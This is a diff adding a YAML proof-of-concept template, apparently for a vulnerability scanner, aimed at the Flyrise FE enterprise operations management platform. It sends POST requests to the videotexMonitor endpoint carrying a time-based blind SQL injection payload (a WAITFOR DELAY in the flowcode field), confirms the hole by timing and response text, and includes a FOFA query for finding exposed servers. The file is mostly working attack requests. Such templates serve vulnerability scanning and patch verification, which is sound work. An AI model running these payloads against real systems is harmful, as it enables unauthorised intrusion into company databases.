@@ -1,0 +1,29 @@
+id: poc-yaml-flyrise-videotexmonitor-sqli
+info:
+  name: 飞企互联-FE企业运营管理平台 videotexMonitor sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业运营管理平台
+  fofa: app="飞企互联-FE企业运营管理平台"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /cooperate/videotexMonitor.js%70
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: master_key=1&flowcode=1';WAITFOR+DELAY '0:0:{{.t1}}'--&dialogid=1
+  expression: "status_code == 200 && \ncontains(body,\"子任务信息\") &&\ncontains(body,\"\
+    环节名称\") &&\ncontains(body,\"办理用户\") &&\nduration >= t1 &&\nduration <= t2\n"
+- method: POST
+  path: /cooperate/videotexMonitor.js%70
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: master_key=1&flowcode=1';WAITFOR+DELAY '0:0:{{.t3}}'--&dialogid=1
+  expression: "status_code == 200 && \ncontains(body,\"子任务信息\") &&\ncontains(body,\"\
+    环节名称\") &&\ncontains(body,\"办理用户\") &&\nduration >= t3 &&\nduration <= t4\n"
+transport: http
